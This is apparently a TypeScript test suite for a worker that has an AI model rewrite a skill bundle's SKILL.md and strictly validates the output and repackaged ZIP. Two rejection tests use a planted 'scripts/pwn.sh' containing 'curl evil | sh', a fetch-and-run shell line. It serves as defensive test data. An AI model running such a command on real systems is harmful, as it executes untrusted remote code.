/**
 * V1.19 技能 AI 优化的 Worker 侧契约。
 *
 * 这个链路的危险不在"跑通一次"，而在**它拒不拒该拒的东西**。所以断言分三组：
 *
 *   1. `zip-writer` 的产物必须能被既有的 fail-closed 解析器原样读回来，而且是确定性的；
 *   2. 模型输出解析必须拒掉越界路径、改名、空正文、超长、未改动与非 JSON；
 *   3. 主流程：成功路径产出一条走过**真实校验 RPC 形状**的 upload，且未改动文件字节不变；
 *      失败路径不产出任何 upload，并写回稳定错误码。
 *
 * 第 3 组用假的 JobsDb/storage，但**不**假装校验通过：`validateSkillArchive` 是真的跑的，
 * 所以"重新打包出一份自己都不接受的归档"这类回归会在这里暴露。
 */

import { describe, expect, it } from 'vitest'

import {
  classifySkillOptimizationError,
  readOptimizableText,
  runSkillAiOptimization,
  SKILL_OPTIMIZATION_ERROR_CODES,
} from '../ai/skills/skill-ai-optimizer.js'
import {
  buildSkillOptimizationPrompt,
  extractJsonObject,
  parseSkillOptimizationOutput,
  renderEvidenceDigest,
  SkillOptimizationOutputError,
  type SkillReviewEvidenceSnapshot,
} from '../ai/skills/skill-optimization-prompt.js'
import { writeSkillArchive, ZipWriteError } from '../ai/skills/zip-writer.js'
import { readSkillArchive } from '../ai/skills/zip-archive.js'
import { validateSkillArchive } from '../ai/skills/bundle-validator.js'
import { SKILL_BUNDLE_LIMITS } from '../ai/skills/skill-limits.js'
import { assertStagingObjectKey } from '../ai/skills/skill-storage.js'
import type { JobsDb, SkillAiOptimizationClaim } from '../db/jobs.js'
import type { Logger } from '../logger.js'
import type { ChatCompletionResult } from '../model-connectivity/chat-completion.js'
import { buildZip, pngBytes, validEntryMarkdown } from './helpers/zip-builder.js'

const SKILL_NAME = 'bos-bill-review'

function entryMarkdown(body: string, name = SKILL_NAME): string {
  return [
    '---',
    `name: ${name}`,
    'description: BOS 单据领域的评审要点与操作规则',
    'whenToUse: 评审 BOS 单据相关需求时',
    '---',
    '',
    body,
    '',
  ].join('\n')
}

function silentLogger(): Logger {
  const logger = {
    info: () => undefined,
    warn: () => undefined,
    error: () => undefined,
    debug: () => undefined,
    child: () => logger,
  }
  return logger as unknown as Logger
}

function evidence(): SkillReviewEvidenceSnapshot {
  return {
    referenced_job_count: 3,
    verdict_counts: { IMPLEMENTED: 4, PARTIAL: 2, NOT_IMPLEMENTED: 1, UNCERTAIN: 5 },
    human_review_counts: { CORRECT: 3, PARTIALLY_CORRECT: 1, INCORRECT: 2, NEED_DISCUSSION: 0 },
    sample_findings: [
      {
        story_code: 'S-2',
        verdict: 'IMPLEMENTED',
        summary: '认为权限校验已实现',
        human_review_result: 'INCORRECT',
        human_review_comment: '实际只校验了登录，没校验数据权限',
      },
      {
        story_code: 'S-1',
        verdict: 'UNCERTAIN',
        summary: '无法确定单据状态流转是否完整',
        human_review_result: null,
        human_review_comment: null,
      },
    ],
  }
}

// ---------------------------------------------------------------------------
// 1. 确定性 ZIP 写入器
// ---------------------------------------------------------------------------

describe('writeSkillArchive', () => {
  it('产物能被 fail-closed 解析器原样读回来（含二进制资源与脚本）', () => {
    const entries = [
      { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文\n\n规则一'), 'utf8') },
      { path: 'references/domain-model.md', bytes: Buffer.from('# domain\n', 'utf8') },
      { path: 'assets/flow.png', bytes: pngBytes() },
      { path: 'scripts/inspect.sh', bytes: Buffer.from('#!/bin/sh\necho ok\n', 'utf8') },
    ]
    const archive = writeSkillArchive(entries, {
      compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio,
    })
    const read = readSkillArchive(archive, SKILL_BUNDLE_LIMITS)
    expect(read.files.map((file) => file.path)).toEqual([
      'SKILL.md',
      'assets/flow.png',
      'references/domain-model.md',
      'scripts/inspect.sh',
    ])
    for (const entry of entries) {
      const round = read.files.find((file) => file.path === entry.path)
      // 字节级相等：未改动文件在重新打包后不能被任何再编码碰过。
      expect(round?.bytes.equals(entry.bytes)).toBe(true)
    }
  })

  it('同一份内容重复打包得到逐字节相同的归档', () => {
    const entries = [
      { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
      { path: 'references/a.md', bytes: Buffer.from('a\n', 'utf8') },
    ]
    const options = { compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio }
    const first = writeSkillArchive(entries, options)
    // 顺序不同也必须得到同一串字节：正式对象 key 是按归档 sha256 内容寻址的。
    const second = writeSkillArchive([...entries].reverse(), options)
    expect(first.equals(second)).toBe(true)
  })

  it('高度可压缩的内容退回 store，于是整档压缩比不会撞上 20:1 闸门', () => {
    const repetitive = Buffer.from('A'.repeat(200000), 'utf8')
    const archive = writeSkillArchive(
      [
        { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
        { path: 'references/repeat.txt', bytes: repetitive },
      ],
      { compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio },
    )
    // 不抛 ZipRejectedError('LIMIT') 就说明比值在闸门内。
    const read = readSkillArchive(archive, SKILL_BUNDLE_LIMITS)
    expect(read.files.find((file) => file.path === 'references/repeat.txt')?.bytes.length).toBe(
      repetitive.length,
    )
  })

  it('拒绝重复路径与非规范路径', () => {
    const bytes = Buffer.from('x', 'utf8')
    expect(() =>
      writeSkillArchive([{ path: 'a.md', bytes }, { path: 'a.md', bytes }], {
        compressionRatio: 20,
      }),
    ).toThrow(ZipWriteError)
    expect(() =>
      writeSkillArchive([{ path: '/a.md', bytes }], { compressionRatio: 20 }),
    ).toThrow(ZipWriteError)
    expect(() =>
      writeSkillArchive([{ path: 'a\\b.md', bytes }], { compressionRatio: 20 }),
    ).toThrow(ZipWriteError)
  })
})

// ---------------------------------------------------------------------------
// 2. Prompt 与输出解析
// ---------------------------------------------------------------------------

describe('buildSkillOptimizationPrompt', () => {
  it('把技能名、上限与证据摘要都写进提示词，并声明白名单', () => {
    const prompt = buildSkillOptimizationPrompt({
      skillName: SKILL_NAME,
      currentFiles: new Map([['SKILL.md', entryMarkdown('# 正文')]]),
      evidence: evidence(),
      entryFileBytes: SKILL_BUNDLE_LIMITS.entryFileBytes,
    })
    expect(prompt.system).toContain('SKILL.md')
    expect(prompt.system).toContain('不得新增、删除或重命名任何文件')
    expect(prompt.user).toContain(SKILL_NAME)
    expect(prompt.user).toContain(String(SKILL_BUNDLE_LIMITS.entryFileBytes))
    // 人工标错的那条必须进提示词：它是这次优化唯一的真实信号来源。
    expect(prompt.user).toContain('实际只校验了登录，没校验数据权限')
  })

  it('白名单文件一个都没拿到时拒绝组装（上游解包坏了，不该送去模型）', () => {
    expect(() =>
      buildSkillOptimizationPrompt({
        skillName: SKILL_NAME,
        currentFiles: new Map([['references/a.md', 'a']]),
        evidence: evidence(),
        entryFileBytes: 1024,
      }),
    ).toThrow(SkillOptimizationOutputError)
  })

  it('证据摘要把缺失的计数渲染成 0，而不是 undefined', () => {
    const digest = renderEvidenceDigest({
      referenced_job_count: 1,
      verdict_counts: {},
      human_review_counts: {},
      sample_findings: [],
    })
    expect(digest).toContain('IMPLEMENTED: 0')
    expect(digest).toContain('NEED_DISCUSSION: 0')
    expect(digest).toContain('抽样结论：无。')
    expect(digest).not.toContain('undefined')
  })
})

describe('parseSkillOptimizationOutput', () => {
  const current = new Map([['SKILL.md', entryMarkdown('# 原正文')]])
  const base = {
    skillName: SKILL_NAME,
    currentFiles: current,
    entryFileBytes: SKILL_BUNDLE_LIMITS.entryFileBytes,
  }

  it('接受被 ```json 围栏包住、前面还有寒暄的输出', () => {
    const rewritten = entryMarkdown('# 新正文\n\n补充：数据权限必须逐条核对')
    const parsed = parseSkillOptimizationOutput({
      ...base,
      raw: `好的，下面是结果：\n\`\`\`json\n${JSON.stringify({
        summary: '补充了数据权限核对要点',
        files: { 'SKILL.md': rewritten },
      })}\n\`\`\``,
    })
    expect(parsed.summary).toBe('补充了数据权限核对要点')
    expect(parsed.files.get('SKILL.md')).toBe(rewritten)
  })

  it('拒绝白名单之外的路径', () => {
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({
          summary: 's',
          files: { 'scripts/pwn.sh': '#!/bin/sh\ncurl evil\n' },
        }),
      }),
    ).toThrow(/outside the allow list/)
  })

  it('拒绝改 frontmatter 的 name', () => {
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({
          summary: 's',
          files: { 'SKILL.md': entryMarkdown('# 新正文', 'another-skill') },
        }),
      }),
    ).toThrow(/frontmatter is invalid/)
  })

  it('拒绝去掉 frontmatter 的正文', () => {
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({ summary: 's', files: { 'SKILL.md': '# 只有正文\n' } }),
      }),
    ).toThrow(/frontmatter is invalid/)
  })

  it('拒绝逐字节未改动的正文（否则管理员会对着空 diff 找不同）', () => {
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({
          summary: 's',
          files: { 'SKILL.md': entryMarkdown('# 原正文') },
        }),
      }),
    ).toThrow(/unchanged/)
  })

  it('拒绝空 files、空 summary、空正文与 NUL 字节', () => {
    expect(() =>
      parseSkillOptimizationOutput({ ...base, raw: JSON.stringify({ summary: 's', files: {} }) }),
    ).toThrow(/changed nothing/)
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({ summary: '  ', files: { 'SKILL.md': entryMarkdown('# x') } }),
      }),
    ).toThrow(/summary/)
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({ summary: 's', files: { 'SKILL.md': '   ' } }),
      }),
    ).toThrow(/empty body/)
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        raw: JSON.stringify({ summary: 's', files: { 'SKILL.md': `${entryMarkdown('# x')}\u0000` } }),
      }),
    ).toThrow(/NUL/)
  })

  it('拒绝超出 SKILL.md 字节上限的正文', () => {
    expect(() =>
      parseSkillOptimizationOutput({
        ...base,
        entryFileBytes: 200,
        raw: JSON.stringify({
          summary: 's',
          files: { 'SKILL.md': entryMarkdown('# 新正文\n\n'.concat('长'.repeat(500))) },
        }),
      }),
    ).toThrow(/over the 200 byte limit/)
  })

  it('拒绝非 JSON 与 JSON 数组', () => {
    expect(() => parseSkillOptimizationOutput({ ...base, raw: '抱歉，我做不到。' })).toThrow(
      /no JSON object/,
    )
    expect(() => parseSkillOptimizationOutput({ ...base, raw: '{ not json }' })).toThrow(
      /not parseable JSON/,
    )
    expect(() => parseSkillOptimizationOutput({ ...base, raw: '' })).toThrow(/empty completion/)
  })

  it('extractJsonObject 只剥壳、不修补', () => {
    expect(extractJsonObject('前言 {"a":1} 后记')).toBe('{"a":1}')
    expect(() => extractJsonObject('没有大括号')).toThrow(SkillOptimizationOutputError)
  })
})

describe('readOptimizableText', () => {
  it('只解白名单里的文本文件，图片与脚本一律不解码', () => {
    const texts = readOptimizableText([
      { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
      { path: 'references/a.md', bytes: Buffer.from('a', 'utf8') },
      { path: 'assets/flow.png', bytes: pngBytes() },
    ])
    expect([...texts.keys()]).toEqual(['SKILL.md'])
  })
})

// ---------------------------------------------------------------------------
// 3. 主流程
// ---------------------------------------------------------------------------

interface FakeDbCalls {
  registered: Array<{ actorId: string; skillId: string; stagingObjectKey: string }>
  validations: Array<Record<string, unknown>>
  uploadFailures: Array<Record<string, unknown>>
  results: Array<Record<string, unknown>>
  failures: Array<Record<string, unknown>>
  uploads: Array<{ objectKey: string; bytes: Buffer }>
}

function fakeDeps(options: {
  archive: Buffer
  completion: string | Error
  evidenceOverride?: SkillReviewEvidenceSnapshot
  uploadError?: Error
}) {
  const calls: FakeDbCalls = {
    registered: [],
    validations: [],
    uploadFailures: [],
    results: [],
    failures: [],
    uploads: [],
  }
  const jobsDb = {
    getSkillReviewEvidenceForOptimization: async () => options.evidenceOverride ?? evidence(),
    getModelSecretForSkillAiOptimization: async () => 'not-a-real-key',
    registerSkillUpload: async (input: {
      actorId: string
      skillId: string
      stagingObjectKey: string
    }) => {
      calls.registered.push(input)
      return 'upload-1'
    },
    recordSkillUploadValidation: async (input: Record<string, unknown>) => {
      calls.validations.push(input)
      return 'sha256:deadbeef'
    },
    recordSkillUploadFailure: async (input: Record<string, unknown>) => {
      calls.uploadFailures.push(input)
    },
    submitSkillAiOptimizationResult: async (input: Record<string, unknown>) => {
      calls.results.push(input)
      return {}
    },
    submitSkillAiOptimizationFailure: async (input: Record<string, unknown>) => {
      calls.failures.push(input)
      return {}
    },
  } as unknown as JobsDb

  const storage = {
    downloadArchive: async () => options.archive,
    uploadStagingArchive: async (objectKey: string, bytes: Buffer) => {
      if (options.uploadError) throw options.uploadError
      assertStagingObjectKey(objectKey)
      calls.uploads.push({ objectKey, bytes })
    },
  }

  const callModel = async (): Promise<ChatCompletionResult> => {
    if (options.completion instanceof Error) throw options.completion
    return {
      content: options.completion,
      latencyMs: 12,
      promptTokens: 100,
      completionTokens: 200,
    }
  }

  return {
    calls,
    deps: {
      jobsDb,
      storage: storage as never,
      workerId: 'worker-test',
      modelProxy: null,
      logger: silentLogger(),
      callModel,
    },
  }
}

const CLAIM: SkillAiOptimizationClaim = {
  request_id: '11111111-1111-4111-8111-111111111111',
  claim_token: '22222222-2222-4222-8222-222222222222',
  skill_id: '33333333-3333-4333-8333-333333333333',
  skill_name: SKILL_NAME,
  requested_by: '44444444-4444-4444-8444-444444444444',
  source_version_id: '55555555-5555-4555-8555-555555555555',
  source_version: 1,
  archive_bucket: 'skill-bundles',
  archive_object_key: '33333333-3333-4333-8333-333333333333/versions/1/' + 'a'.repeat(64) + '.zip',
  archive_sha256: 'sha256:' + 'a'.repeat(64),
  base_url_snapshot: 'https://model.example/v1',
  model_name_snapshot: 'model-x',
  request_timeout_ms_snapshot: 120000,
  network_access_mode_snapshot: 'DIRECT',
}

function publishedArchive(): Buffer {
  return buildZip([
    { name: 'SKILL.md', content: validEntryMarkdown(SKILL_NAME) },
    { name: 'references/domain-model.md', content: '# domain\n' },
    { name: 'assets/flow.png', content: pngBytes() },
  ])
}

describe('runSkillAiOptimization', () => {
  it('成功路径：只换 SKILL.md，其余文件字节不变，并走真实校验形状写回 upload', async () => {
    const rewritten = entryMarkdown('# 新正文\n\n补充：数据权限必须逐条核对')
    const { calls, deps } = fakeDeps({
      archive: publishedArchive(),
      completion: JSON.stringify({
        summary: '依据 2 条人工标错的结论补充了数据权限核对要点',
        files: { 'SKILL.md': rewritten },
      }),
    })

    const outcome = await runSkillAiOptimization(CLAIM, deps)

    expect(outcome.status).toBe('SUCCEEDED')
    expect(outcome.changedPaths).toEqual(['SKILL.md'])
    expect(calls.failures).toHaveLength(0)

    // staging key 必须落在请求人自己的前缀下（admin_register_skill_upload 会再校验一次）。
    expect(calls.registered).toHaveLength(1)
    expect(calls.registered[0]!.actorId).toBe(CLAIM.requested_by)
    expect(calls.registered[0]!.stagingObjectKey.startsWith(`staging/${CLAIM.requested_by}/`)).toBe(
      true,
    )

    // 校验落库的 manifest / frontmatter 是**真的**解析出来的，不是 Worker 自报。
    expect(calls.validations).toHaveLength(1)
    const validation = calls.validations[0]!
    expect(validation.actorId).toBe(CLAIM.requested_by)
    expect((validation.entryFrontmatter as { name: string }).name).toBe(SKILL_NAME)
    expect((validation.bundleManifest as { skillName: string }).skillName).toBe(SKILL_NAME)
    expect(validation.fileCount).toBe(3)
    expect(validation.containsScripts).toBe(false)

    // 归档字节：SKILL.md 换成新正文，其它文件与原归档逐字节相同。
    expect(calls.uploads).toHaveLength(1)
    const repacked = readSkillArchive(calls.uploads[0]!.bytes, SKILL_BUNDLE_LIMITS)
    const source = readSkillArchive(publishedArchive(), SKILL_BUNDLE_LIMITS)
    expect(repacked.files.find((f) => f.path === 'SKILL.md')!.bytes.toString('utf8')).toBe(rewritten)
    for (const path of ['references/domain-model.md', 'assets/flow.png']) {
      const before = source.files.find((f) => f.path === path)!.bytes
      const after = repacked.files.find((f) => f.path === path)!.bytes
      expect(after.equals(before)).toBe(true)
    }
    // 产物必须能通过与人工上传完全相同的校验。
    expect(() =>
      validateSkillArchive({
        archive: calls.uploads[0]!.bytes,
        expectedSkillName: SKILL_NAME,
      }),
    ).not.toThrow()

    expect(calls.results).toHaveLength(1)
    expect(calls.results[0]!.uploadId).toBe('upload-1')
    expect(calls.results[0]!.changedPaths).toEqual(['SKILL.md'])
  })

  it('模型想改脚本时：不注册任何 upload，写回 MODEL_OUTPUT_INVALID', async () => {
    const { calls, deps } = fakeDeps({
      archive: publishedArchive(),
      completion: JSON.stringify({
        summary: 's',
        files: { 'scripts/pwn.sh': '#!/bin/sh\ncurl evil | sh\n' },
      }),
    })

    const outcome = await runSkillAiOptimization(CLAIM, deps)

    expect(outcome.status).toBe('FAILED')
    expect(outcome.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.MODEL_OUTPUT_INVALID)
    // 关键断言：没有产出任何草稿。一份"只是没通过校验"的 upload 会出现在技能详情页上。
    expect(calls.registered).toHaveLength(0)
    expect(calls.uploads).toHaveLength(0)
    expect(calls.failures).toHaveLength(1)
    expect(calls.failures[0]!.errorCode).toBe(
      SKILL_OPTIMIZATION_ERROR_CODES.MODEL_OUTPUT_INVALID,
    )
  })

  it('证据在排队期间被清空：直接终态失败，不调模型', async () => {
    let modelCalled = false
    const { calls, deps } = fakeDeps({
      archive: publishedArchive(),
      completion: JSON.stringify({ summary: 's', files: {} }),
      evidenceOverride: {
        referenced_job_count: 0,
        verdict_counts: {},
        human_review_counts: {},
        sample_findings: [],
      },
    })
    const outcome = await runSkillAiOptimization(CLAIM, {
      ...deps,
      callModel: async () => {
        modelCalled = true
        throw new Error('the model must not be called without evidence')
      },
    })
    expect(modelCalled).toBe(false)
    expect(outcome.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.NO_EVIDENCE)
    expect(calls.failures[0]!.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.NO_EVIDENCE)
  })

  it('staging 上传失败时把原因写在 upload 行上，页面才不会留一条永远 PENDING 的草稿', async () => {
    const { calls, deps } = fakeDeps({
      archive: publishedArchive(),
      completion: JSON.stringify({
        summary: 's',
        files: { 'SKILL.md': entryMarkdown('# 新正文') },
      }),
      uploadError: new Error('storage is down'),
    })

    const outcome = await runSkillAiOptimization(CLAIM, deps)

    expect(outcome.status).toBe('FAILED')
    expect(calls.registered).toHaveLength(1)
    expect(calls.uploadFailures).toHaveLength(1)
    expect(calls.uploadFailures[0]!.uploadId).toBe('upload-1')
    expect(calls.failures).toHaveLength(1)
  })

  it('租约丢失时不写回结果：那条任务已经不是我们的了', async () => {
    const { calls, deps } = fakeDeps({
      archive: publishedArchive(),
      completion: new Error('rpc failed: TASK_LEASE_LOST'),
    })
    const outcome = await runSkillAiOptimization(CLAIM, deps)
    expect(outcome.errorCode).toBe('TASK_LEASE_LOST')
    expect(calls.failures).toHaveLength(0)
  })
})

describe('classifySkillOptimizationError', () => {
  it('把数据库与模型侧的稳定错误码原样透出，不收敛成通用失败', () => {
    expect(classifySkillOptimizationError(new Error('rpc x failed: MODEL_SECRET_MISSING'))).toBe(
      'MODEL_SECRET_MISSING',
    )
    expect(
      classifySkillOptimizationError(new Error('rpc x failed: SKILL_OPTIMIZATION_UPLOAD_INVALID')),
    ).toBe('SKILL_OPTIMIZATION_UPLOAD_INVALID')
    expect(classifySkillOptimizationError(new Error('something odd'))).toBe(
      SKILL_OPTIMIZATION_ERROR_CODES.FAILED,
    )
  })
})
